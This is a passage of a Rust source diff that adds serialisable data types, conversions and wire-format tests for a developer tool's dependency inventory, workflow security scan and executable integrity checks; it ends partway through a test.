@@ -6,10 +6,17 @@ use std::{
 use dustfril_core::models::{
     ArtifactChangeKind, ArtifactSizeChange, ArtifactSnapshot, ArtifactSnapshotArtifact,
     ArtifactSnapshotResult, ArtifactSnapshotStatus, CleanupFailureReason, CleanupRecommendation,
-    DeleteMode, DeveloperStorageSummary, Ecosystem, LifecycleScript, LockfileCheck, LockfileKind,
-    LockfileStatus, PackageManager, ProjectIdentity, ProjectTechnology, RecommendationPolicy,
-    RiskLevel, ScriptType, SecurityFinding, SecurityReport, SecurityWarning, StorageSummary,
-    TechnologyEvidence, VolumeStorage, DEFAULT_CLEANUP_AGE_DAYS,
+    DeleteMode, DependencyBaselineStatus, DependencyChange, DependencyChangeKind, DependencyDiff,
+    DependencyEntry, DependencyLockfile, DependencyLockfileStatus, DependencyMetric,
+    DependencyMetricStatus, DependencyReport, DependencyReportStatus, DependencyScope,
+    DeveloperStorageSummary, DuplicateDependency, Ecosystem, ExecutableObservation, IntegrityCheck,
+    IntegrityFailure, IntegrityFailureKind, IntegrityReport, IntegrityStatus, LifecycleScript,
+    LockfileCheck, LockfileKind, LockfileStatus, PackageManager, ProjectIdentity,
+    ProjectTechnology, RecommendationPolicy, RiskLevel, ScriptType, SecurityFinding,
+    SecurityReport, SecurityWarning, SignatureFailure, SignatureFailureKind, SignaturePlatform,
+    SignatureReport, SignatureStatus, StorageSummary, TechnologyEvidence, ToolSpec, VolumeStorage,
+    Workflow, WorkflowExposureSink, WorkflowFinding, WorkflowFindingCategory, WorkflowScanNotice,
+    WorkflowScanReport, DEFAULT_CLEANUP_AGE_DAYS, MAX_ARTIFACT_SNAPSHOTS_PER_WORKSPACE,
 };
 use serde::{Deserialize, Serialize};
 
@@ -37,6 +44,14 @@ impl RunOptions {
 
 #[derive(Debug, Deserialize, PartialEq, Eq)]
 #[serde(rename_all = "camelCase", deny_unknown_fields)]
+pub(crate) struct DependencyBaselineAcceptOptions {
+    pub(crate) root: Option<String>,
+    pub(crate) ecosystems: Vec<EcosystemDto>,
+    pub(crate) expected_inventory_fingerprint: String,
+}
+
+#[derive(Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase", deny_unknown_fields)]
 pub(crate) struct ExecuteCleanupRequest {
     pub(crate) root: String,
     pub(crate) ecosystems: Vec<EcosystemDto>,
@@ -56,6 +71,8 @@ pub(crate) struct ArtifactSelectionInput {
 #[serde(rename_all = "camelCase")]
 pub(crate) struct ScanResponse {
     pub(crate) artifacts: Vec<ArtifactDto>,
+    #[serde(skip_serializing_if = "Vec::is_empty")]
+    pub(crate) projects: Vec<ProjectIdentityDto>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub(crate) history_warning: Option<String>,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -71,6 +88,14 @@ pub(crate) struct ArtifactSnapshotResultDto {
     pub(crate) snapshot: ArtifactSnapshotDto,
     pub(crate) previous_snapshot: Option<ArtifactSnapshotDto>,
     pub(crate) changes: Vec<ArtifactSizeChangeDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct ArtifactSnapshotHistoryDto {
+    pub(crate) entries: Vec<ArtifactSnapshotResultDto>,
+    pub(crate) retained_snapshot_count: usize,
+    pub(crate) retention_limit: usize,
 }
 
 #[derive(Debug, Serialize, PartialEq, Eq)]
@@ -114,6 +139,18 @@ pub(crate) fn artifact_snapshot_to_dto(
             .into_iter()
             .map(artifact_size_change_to_dto)
             .collect(),
+    }
+}
+
+pub(crate) fn artifact_snapshot_history_to_dto(
+    entries: Vec<ArtifactSnapshotResult>,
+) -> ArtifactSnapshotHistoryDto {
+    let retained_snapshot_count = entries.len();
+
+    ArtifactSnapshotHistoryDto {
+        entries: entries.into_iter().map(artifact_snapshot_to_dto).collect(),
+        retained_snapshot_count,
+        retention_limit: MAX_ARTIFACT_SNAPSHOTS_PER_WORKSPACE,
     }
 }
 
@@ -389,6 +426,7 @@ pub(crate) struct CleanupHistoryEntryDto {
 #[serde(rename_all = "camelCase")]
 pub(crate) struct LifecycleScriptDto {
     pub(crate) package: String,
+    pub(crate) manifest_path: String,
     pub(crate) package_manager: PackageManagerDto,
     pub(crate) script_type: ScriptTypeDto,
     pub(crate) command: String,
@@ -399,11 +437,180 @@ pub(crate) struct LifecycleScriptDto {
 #[serde(rename_all = "camelCase")]
 pub(crate) struct SecurityScanResponse {
     pub(crate) findings: Vec<SecurityFindingDto>,
+    pub(crate) lifecycle_scripts: Vec<LifecycleScriptDto>,
     pub(crate) lifecycle_warnings: Vec<SecurityWarningDto>,
     pub(crate) lockfiles: Vec<LockfileCheckDto>,
     pub(crate) manifests: Vec<String>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub(crate) history_warning: Option<String>,
+}
+
+#[derive(Debug, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase", deny_unknown_fields)]
+pub(crate) struct IntegrityScanOptions {
+    #[serde(default)]
+    pub(crate) tools: Vec<String>,
+}
+
+impl IntegrityScanOptions {
+    pub(crate) fn tools(self) -> Vec<ToolSpec> {
+        if self.tools.is_empty() {
+            dustfril_core::api::integrity::default_tools()
+        } else {
+            self.tools.into_iter().map(ToolSpec::from).collect()
+        }
+    }
+}
+
+/// Structured, presentation-safe result for the local GitHub Actions scan.
+///
+/// Workflow YAML is intentionally reduced to file/job metadata here. The
+/// desktop receives findings and partial-analysis notices, but never the
+/// parsed environment or action input values that Core uses internally.
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct WorkflowScanResponse {
+    pub(crate) workflows: Vec<WorkflowSummaryDto>,
+    pub(crate) findings: Vec<WorkflowFindingDto>,
+    pub(crate) notices: Vec<WorkflowScanNoticeDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct IntegrityScanResponse {
+    pub(crate) checks: Vec<IntegrityCheckDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct WorkflowSummaryDto {
+    pub(crate) path: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) name: Option<String>,
+    pub(crate) analysis_status: WorkflowAnalysisStatusDto,
+    pub(crate) jobs: Vec<WorkflowJobSummaryDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct IntegrityCheckDto {
+    pub(crate) requested_tool: String,
+    pub(crate) status: IntegrityStatus,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) observation: Option<ExecutableObservationDto>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) previous_observation: Option<ExecutableObservationDto>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) failure: Option<IntegrityFailureDto>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) signature: Option<SignatureReportDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct WorkflowJobSummaryDto {
+    pub(crate) id: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) name: Option<String>,
+    pub(crate) step_count: usize,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum WorkflowAnalysisStatusDto {
+    Analyzed,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct ExecutableObservationDto {
+    pub(crate) requested_tool: String,
+    pub(crate) resolved_path: String,
+    pub(crate) canonical_path: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) symlink_target: Option<String>,
+    pub(crate) size_bytes: u64,
+    pub(crate) sha256: String,
+    pub(crate) observed_at: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) version_metadata: Option<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct WorkflowFindingDto {
+    pub(crate) workflow_path: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) job_id: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) step_index: Option<usize>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) step_name: Option<String>,
+    pub(crate) rule_id: String,
+    pub(crate) category: WorkflowFindingCategoryDto,
+    pub(crate) risk_level: RiskLevelDto,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) evidence: Option<String>,
+    pub(crate) reason: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) secret_reference: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) exposure_sink: Option<WorkflowExposureSinkDto>,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum WorkflowFindingCategoryDto {
+    SuspiciousCommand,
+    TokenPermissions,
+    SecretExposure,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum WorkflowExposureSinkDto {
+    Stdout,
+    NetworkRequest,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct IntegrityFailureDto {
+    pub(crate) kind: IntegrityFailureKind,
+    pub(crate) message: String,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct SignatureReportDto {
+    pub(crate) platform: SignaturePlatform,
+    pub(crate) status: SignatureStatus,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) signer: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) team_identifier: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) verification_message: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) verification_code: Option<i32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) failure: Option<SignatureFailureDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct SignatureFailureDto {
+    pub(crate) kind: SignatureFailureKind,
+    pub(crate) message: String,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct WorkflowScanNoticeDto {
+    pub(crate) workflow_path: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) job_id: Option<String>,
+    pub(crate) reason: String,
 }
 
 #[derive(Debug, Serialize, PartialEq, Eq)]
@@ -424,6 +631,138 @@ pub(crate) struct SecurityWarningDto {
     pub(crate) script_type: String,
     pub(crate) command: String,
     pub(crate) risk_level: RiskLevelDto,
+    pub(crate) reason: String,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyInventoryResponse {
+    pub(crate) inventory_fingerprint: String,
+    pub(crate) workspace_path: String,
+    pub(crate) reports: Vec<DependencyReportDto>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub(crate) diff: Option<DependencyDiffDto>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyReportDto {
+    pub(crate) ecosystem: EcosystemDto,
+    pub(crate) status: DependencyReportStatusDto,
+    pub(crate) manifest: String,
+    pub(crate) manifest_format: Option<String>,
+    pub(crate) lockfile: Option<DependencyLockfileDto>,
+    pub(crate) direct_dependency_counts: std::collections::BTreeMap<String, usize>,
+    pub(crate) direct_dependency_total: usize,
+    pub(crate) resolved_dependency_count: DependencyMetricDto,
+    pub(crate) transitive_dependency_count: DependencyMetricDto,
+    pub(crate) duplicate_versions: Vec<DuplicateDependencyDto>,
+    pub(crate) resolved_dependencies: Vec<DependencyEntryDto>,
+    pub(crate) warnings: Vec<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyMetricDto {
+    pub(crate) value: Option<usize>,
+    pub(crate) status: DependencyMetricStatusDto,
+    pub(crate) reason: Option<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyLockfileDto {
+    pub(crate) path: String,
+    pub(crate) kind: Option<LockfileKindDto>,
+    pub(crate) format: Option<String>,
+    pub(crate) status: DependencyLockfileStatusDto,
+    pub(crate) reason: Option<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DuplicateDependencyDto {
+    pub(crate) name: String,
+    pub(crate) versions: Vec<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyEntryDto {
+    pub(crate) ecosystem: EcosystemDto,
+    pub(crate) name: String,
+    pub(crate) version: String,
+    pub(crate) source: Option<String>,
+    pub(crate) scope: DependencyScopeDto,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyDiffDto {
+    pub(crate) workspace_id: String,
+    pub(crate) baseline_status: DependencyBaselineStatusDto,
+    pub(crate) added: Vec<DependencyChangeDto>,
+    pub(crate) removed: Vec<DependencyChangeDto>,
+    pub(crate) version_changes: Vec<DependencyChangeDto>,
+    pub(crate) source_changes: Vec<DependencyChangeDto>,
+    pub(crate) warnings: Vec<String>,
+}
+
+#[derive(Debug, Serialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) struct DependencyChangeDto {
+    pub(crate) kind: DependencyChangeKindDto,
+    pub(crate) previous: Option<DependencyEntryDto>,
+    pub(crate) current: Option<DependencyEntryDto>,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyReportStatusDto {
+    Complete,
+    MissingLockfile,
+    Unsupported,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyMetricStatusDto {
+    Available,
+    Unknown,
+    Unsupported,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyLockfileStatusDto {
+    Parsed,
+    Missing,
+    Unsupported,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyScopeDto {
+    Direct,
+    Transitive,
+    Unknown,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyBaselineStatusDto {
+    BaselineCreated,
+    Compared,
+    Unavailable,
+}
+
+#[derive(Debug, Serialize, Clone, Copy, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub(crate) enum DependencyChangeKindDto {
+    Added,
+    Removed,
+    VersionChanged,
+    SourceChanged,
 }
 
 #[derive(Debug, Serialize, PartialEq, Eq)]
@@ -639,6 +978,7 @@ impl From<LifecycleScript> for LifecycleScriptDto {
     fn from(script: LifecycleScript) -> Self {
         Self {
             package: script.package,
+            manifest_path: script.manifest_path.display().to_string(),
             package_manager: script.package_manager.into(),
             script_type: script.script_type.into(),
             command: script.command,
@@ -651,6 +991,11 @@ impl From<SecurityReport> for SecurityScanResponse {
     fn from(report: SecurityReport) -> Self {
         Self {
             findings: report.findings.into_iter().map(Into::into).collect(),
+            lifecycle_scripts: report
+                .lifecycle_scripts
+                .into_iter()
+                .map(Into::into)
+                .collect(),
             lifecycle_warnings: report
                 .lifecycle_warnings
                 .into_iter()
@@ -663,6 +1008,175 @@ impl From<SecurityReport> for SecurityScanResponse {
                 .map(|path| path.display().to_string())
                 .collect(),
             history_warning: None,
+        }
+    }
+}
+
+impl From<IntegrityReport> for IntegrityScanResponse {
+    fn from(report: IntegrityReport) -> Self {
+        Self {
+            checks: report.checks.into_iter().map(Into::into).collect(),
+        }
+    }
+}
+
+impl From<WorkflowScanReport> for WorkflowScanResponse {
+    fn from(report: WorkflowScanReport) -> Self {
+        Self {
+            workflows: report
+                .workflows
+                .into_iter()
+                .map(WorkflowSummaryDto::from)
+                .collect(),
+            findings: report
+                .findings
+                .into_iter()
+                .map(WorkflowFindingDto::from)
+                .collect(),
+            notices: report
+                .notices
+                .into_iter()
+                .map(WorkflowScanNoticeDto::from)
+                .collect(),
+        }
+    }
+}
+
+impl From<IntegrityCheck> for IntegrityCheckDto {
+    fn from(check: IntegrityCheck) -> Self {
+        Self {
+            requested_tool: check.requested_tool,
+            status: check.status,
+            observation: check.observation.map(Into::into),
+            previous_observation: check.previous_observation.map(Into::into),
+            failure: check.failure.map(Into::into),
+            signature: check.signature.map(Into::into),
+        }
+    }
+}
+
+impl From<Workflow> for WorkflowSummaryDto {
+    fn from(workflow: Workflow) -> Self {
+        Self {
+            path: workflow.path.display().to_string(),
+            name: workflow.name,
+            analysis_status: WorkflowAnalysisStatusDto::Analyzed,
+            jobs: workflow
+                .jobs
+                .into_iter()
+                .map(|(id, job)| WorkflowJobSummaryDto {
+                    id,
+                    name: job.name,
+                    step_count: job.steps.len(),
+                })
+                .collect(),
+        }
+    }
+}
+
+impl From<ExecutableObservation> for ExecutableObservationDto {
+    fn from(observation: ExecutableObservation) -> Self {
+        Self {
+            requested_tool: observation.requested_tool,
+            resolved_path: observation.resolved_path.display().to_string(),
+            canonical_path: observation.canonical_path.display().to_string(),
+            symlink_target: observation
+                .symlink_target
+                .map(|path| path.display().to_string()),
+            size_bytes: observation.size_bytes,
+            sha256: observation.sha256,
+            observed_at: observation.observed_at.to_rfc3339(),
+            version_metadata: observation.version_metadata,
+        }
+    }
+}
+
+impl From<WorkflowFinding> for WorkflowFindingDto {
+    fn from(finding: WorkflowFinding) -> Self {
+        // Core already strips secret values from secret findings. Keep the
+        // boundary defensive as well: only expose the supported sink label
+        // and reference name, never a raw expression or command context.
+        let evidence = match finding.category {
+            WorkflowFindingCategory::SecretExposure => finding
+                .exposure_sink
+                .map(|sink| format!("supported {sink} sink")),
+            WorkflowFindingCategory::SuspiciousCommand
+            | WorkflowFindingCategory::TokenPermissions => finding.evidence,
+        };
+
+        Self {
+            workflow_path: finding.workflow_path.display().to_string(),
+            job_id: finding.job_id,
+            step_index: finding.step_index,
+            step_name: finding.step_name,
+            rule_id: finding.rule_id,
+            category: finding.category.into(),
+            risk_level: finding.risk_level.into(),
+            evidence,
+            reason: finding.reason,
+            secret_reference: finding.secret_reference,
+            exposure_sink: finding.exposure_sink.map(Into::into),
+        }
+    }
+}
+
+impl From<IntegrityFailure> for IntegrityFailureDto {
+    fn from(failure: IntegrityFailure) -> Self {
+        Self {
+            kind: failure.kind,
+            message: failure.message,
+        }
+    }
+}
+
+impl From<WorkflowFindingCategory> for WorkflowFindingCategoryDto {
+    fn from(category: WorkflowFindingCategory) -> Self {
+        match category {
+            WorkflowFindingCategory::SuspiciousCommand => Self::SuspiciousCommand,
+            WorkflowFindingCategory::TokenPermissions => Self::TokenPermissions,
+            WorkflowFindingCategory::SecretExposure => Self::SecretExposure,
+        }
+    }
+}
+
+impl From<SignatureReport> for SignatureReportDto {
+    fn from(report: SignatureReport) -> Self {
+        Self {
+            platform: report.platform,
+            status: report.status,
+            signer: report.signer,
+            team_identifier: report.team_identifier,
+            verification_message: report.verification_message,
+            verification_code: report.verification_code,
+            failure: report.failure.map(Into::into),
+        }
+    }
+}
+
+impl From<WorkflowExposureSink> for WorkflowExposureSinkDto {
+    fn from(sink: WorkflowExposureSink) -> Self {
+        match sink {
+            WorkflowExposureSink::Stdout => Self::Stdout,
+            WorkflowExposureSink::NetworkRequest => Self::NetworkRequest,
+        }
+    }
+}
+
+impl From<SignatureFailure> for SignatureFailureDto {
+    fn from(failure: SignatureFailure) -> Self {
+        Self {
+            kind: failure.kind,
+            message: failure.message,
+        }
+    }
+}
+
+impl From<WorkflowScanNotice> for WorkflowScanNoticeDto {
+    fn from(notice: WorkflowScanNotice) -> Self {
+        Self {
+            workflow_path: notice.workflow_path.display().to_string(),
+            job_id: notice.job_id,
+            reason: notice.reason,
         }
     }
 }
@@ -687,6 +1201,7 @@ impl From<SecurityWarning> for SecurityWarningDto {
             script_type: warning.script_type,
             command: warning.command,
             risk_level: warning.risk_level.into(),
+            reason: warning.reason,
         }
     }
 }
@@ -723,10 +1238,180 @@ impl From<LockfileStatus> for LockfileStatusDto {
     }
 }
 
+pub(crate) fn dependency_inventory_to_dto(
+    workspace_path: &Path,
+    reports: Vec<DependencyReport>,
+    diff: Option<DependencyDiff>,
+    inventory_fingerprint: String,
+) -> DependencyInventoryResponse {
+    DependencyInventoryResponse {
+        inventory_fingerprint,
+        workspace_path: workspace_path.display().to_string(),
+        reports: reports.into_iter().map(Into::into).collect(),
+        diff: diff.map(Into::into),
+    }
+}
+
+impl From<DependencyReport> for DependencyReportDto {
+    fn from(report: DependencyReport) -> Self {
+        Self {
+            ecosystem: report.ecosystem.into(),
+            status: report.status.into(),
+            manifest: report.manifest.display().to_string(),
+            manifest_format: report.manifest_format,
+            lockfile: report.lockfile.map(Into::into),
+            direct_dependency_counts: report.direct_dependency_counts,
+            direct_dependency_total: report.direct_dependency_total,
+            resolved_dependency_count: report.resolved_dependency_count.into(),
+            transitive_dependency_count: report.transitive_dependency_count.into(),
+            duplicate_versions: report
+                .duplicate_versions
+                .into_iter()
+                .map(Into::into)
+                .collect(),
+            resolved_dependencies: report
+                .resolved_dependencies
+                .into_iter()
+                .map(Into::into)
+                .collect(),
+            warnings: report.warnings,
+        }
+    }
+}
+
+impl From<DependencyMetric> for DependencyMetricDto {
+    fn from(metric: DependencyMetric) -> Self {
+        Self {
+            value: metric.value,
+            status: metric.status.into(),
+            reason: metric.reason,
+        }
+    }
+}
+
+impl From<DependencyLockfile> for DependencyLockfileDto {
+    fn from(lockfile: DependencyLockfile) -> Self {
+        Self {
+            path: lockfile.path.display().to_string(),
+            kind: lockfile.kind.map(Into::into),
+            format: lockfile.format,
+            status: lockfile.status.into(),
+            reason: lockfile.reason,
+        }
+    }
+}
+
+impl From<DuplicateDependency> for DuplicateDependencyDto {
+    fn from(duplicate: DuplicateDependency) -> Self {
+        Self {
+            name: duplicate.name,
+            versions: duplicate.versions,
+        }
+    }
+}
+
+impl From<DependencyEntry> for DependencyEntryDto {
+    fn from(entry: DependencyEntry) -> Self {
+        Self {
+            ecosystem: entry.ecosystem.into(),
+            name: entry.name,
+            version: entry.version,
+            source: entry.source,
+            scope: entry.scope.into(),
+        }
+    }
+}
+
+impl From<DependencyDiff> for DependencyDiffDto {
+    fn from(diff: DependencyDiff) -> Self {
+        Self {
+            workspace_id: diff.workspace_id,
+            baseline_status: diff.baseline_status.into(),
+            added: diff.added.into_iter().map(Into::into).collect(),
+            removed: diff.removed.into_iter().map(Into::into).collect(),
+            version_changes: diff.version_changes.into_iter().map(Into::into).collect(),
+            source_changes: diff.source_changes.into_iter().map(Into::into).collect(),
+            warnings: diff.warnings,
+        }
+    }
+}
+
+impl From<DependencyChange> for DependencyChangeDto {
+    fn from(change: DependencyChange) -> Self {
+        Self {
+            kind: change.kind.into(),
+            previous: change.previous.map(Into::into),
+            current: change.current.map(Into::into),
+        }
+    }
+}
+
+impl From<DependencyReportStatus> for DependencyReportStatusDto {
+    fn from(status: DependencyReportStatus) -> Self {
+        match status {
+            DependencyReportStatus::Complete => Self::Complete,
+            DependencyReportStatus::MissingLockfile => Self::MissingLockfile,
+            DependencyReportStatus::Unsupported => Self::Unsupported,
+        }
+    }
+}
+
+impl From<DependencyMetricStatus> for DependencyMetricStatusDto {
+    fn from(status: DependencyMetricStatus) -> Self {
+        match status {
+            DependencyMetricStatus::Available => Self::Available,
+            DependencyMetricStatus::Unknown => Self::Unknown,
+            DependencyMetricStatus::Unsupported => Self::Unsupported,
+        }
+    }
+}
+
+impl From<DependencyLockfileStatus> for DependencyLockfileStatusDto {
+    fn from(status: DependencyLockfileStatus) -> Self {
+        match status {
+            DependencyLockfileStatus::Parsed => Self::Parsed,
+            DependencyLockfileStatus::Missing => Self::Missing,
+            DependencyLockfileStatus::Unsupported => Self::Unsupported,
+        }
+    }
+}
+
+impl From<DependencyScope> for DependencyScopeDto {
+    fn from(scope: DependencyScope) -> Self {
+        match scope {
+            DependencyScope::Direct => Self::Direct,
+            DependencyScope::Transitive => Self::Transitive,
+            DependencyScope::Unknown => Self::Unknown,
+        }
+    }
+}
+
+impl From<DependencyBaselineStatus> for DependencyBaselineStatusDto {
+    fn from(status: DependencyBaselineStatus) -> Self {
+        match status {
+            DependencyBaselineStatus::BaselineCreated => Self::BaselineCreated,
+            DependencyBaselineStatus::Compared => Self::Compared,
+            DependencyBaselineStatus::Unavailable => Self::Unavailable,
+        }
+    }
+}
+
+impl From<DependencyChangeKind> for DependencyChangeKindDto {
+    fn from(kind: DependencyChangeKind) -> Self {
+        match kind {
+            DependencyChangeKind::Added => Self::Added,
+            DependencyChangeKind::Removed => Self::Removed,
+            DependencyChangeKind::VersionChanged => Self::VersionChanged,
+            DependencyChangeKind::SourceChanged => Self::SourceChanged,
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use dustfril_core::models::AnalysisResult;
     use serde_json::json;
+    use tempfile::TempDir;
 
     use super::*;
 
@@ -782,6 +1467,135 @@ mod tests {
         .unwrap();
         assert_eq!(refresh_options.record_history, Some(false));
         assert_eq!(refresh_options.record_artifact_snapshot, Some(false));
+    }
+
+    #[test]
+    fn integrity_scan_options_preserve_selected_tools_and_default_to_core_selection() {
+        let defaults = IntegrityScanOptions { tools: Vec::new() }.tools();
+        assert_eq!(defaults, dustfril_core::api::integrity::default_tools());
+
+        let options: IntegrityScanOptions = serde_json::from_value(json!({
+            "tools": ["git", "/Applications/Developer Tools/git"]
+        }))
+        .unwrap();
+        assert_eq!(
+            options.tools(),
+            vec![
+                dustfril_core::models::ToolSpec::from("git"),
+                dustfril_core::models::ToolSpec::from("/Applications/Developer Tools/git")
+            ]
+        );
+    }
+
+    #[test]
+    fn integrity_response_wire_format_preserves_evidence_and_neutral_signature_state() {
+        let observation: ExecutableObservation = serde_json::from_value(json!({
+            "requestedTool": "/Applications/Developer Tools/git",
+            "resolvedPath": "/Applications/Developer Tools/git",
+            "canonicalPath": "/Applications/Developer Tools/git",
+            "symlinkTarget": null,
+            "sizeBytes": 9,
+            "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "observedAt": "2026-09-07T01:02:03Z",
+            "versionMetadata": null
+        }))
+        .unwrap();
+        let report = IntegrityReport {
+            checks: vec![IntegrityCheck {
+                requested_tool: observation.requested_tool.clone(),
+                status: IntegrityStatus::ContentChanged,
+                observation: Some(observation),
+                previous_observation: None,
+                failure: None,
+                signature: Some(SignatureReport {
+                    platform: SignaturePlatform::Linux,
+                    status: SignatureStatus::Unsupported,
+                    signer: None,
+                    team_identifier: None,
+                    verification_message: Some(
+                        "Linux does not provide a universal executable code-signature verifier"
+                            .to_owned(),
+                    ),
+                    verification_code: None,
+                    failure: Some(SignatureFailure {
+                        kind: SignatureFailureKind::PlatformUnsupported,
+                        message: "no verifier".to_owned(),
+                    }),
+                }),
+            }],
+        };
+
+        let response: IntegrityScanResponse = report.into();
+
+        assert_eq!(
+            serde_json::to_value(response).unwrap(),
+            json!({
+                "checks": [{
+                    "requestedTool": "/Applications/Developer Tools/git",
+                    "status": "contentChanged",
+                    "observation": {
+                        "requestedTool": "/Applications/Developer Tools/git",
+                        "resolvedPath": "/Applications/Developer Tools/git",
+                        "canonicalPath": "/Applications/Developer Tools/git",
+                        "sizeBytes": 9,
+                        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                        "observedAt": "2026-09-07T01:02:03+00:00"
+                    },
+                    "signature": {
+                        "platform": "linux",
+                        "status": "unsupported",
+                        "verificationMessage": "Linux does not provide a universal executable code-signature verifier",
+                        "failure": {
+                            "kind": "platformUnsupported",
+                            "message": "no verifier"
+                        }
+                    }
+                }]
+            })
+        );
+    }
+
+    #[test]
+    fn dependency_inventory_wire_format_preserves_availability_and_baseline_state() {
+        let response = dependency_inventory_to_dto(
+            Path::new("/workspace"),
+            vec![DependencyReport::unsupported(
+                Ecosystem::Node,
+                Path::new("/workspace/package.json").to_path_buf(),
+                "unsupported package manager",
+            )],
+            Some(DependencyDiff::empty(
+                "v1:/workspace",
+                DependencyBaselineStatus::Unavailable,
+            )),
+            "fingerprint-1".to_owned(),
+        );
+
+        let value = serde_json::to_value(response).unwrap();
+        assert_eq!(value["inventoryFingerprint"], "fingerprint-1");
+        assert_eq!(value["workspacePath"], "/workspace");
+        assert_eq!(value["reports"][0]["ecosystem"], "Node");
+        assert_eq!(value["reports"][0]["status"], "unsupported");
+        assert_eq!(
+            value["reports"][0]["resolvedDependencyCount"]["status"],
+            "unsupported"
+        );
+        assert_eq!(value["diff"]["workspaceId"], "v1:/workspace");
+        assert_eq!(value["diff"]["baselineStatus"], "unavailable");
+        assert!(value["diff"]["added"].as_array().unwrap().is_empty());
+
+        let accept_options: DependencyBaselineAcceptOptions = serde_json::from_value(json!({
+            "root": "/workspace",
+            "ecosystems": ["Node"],
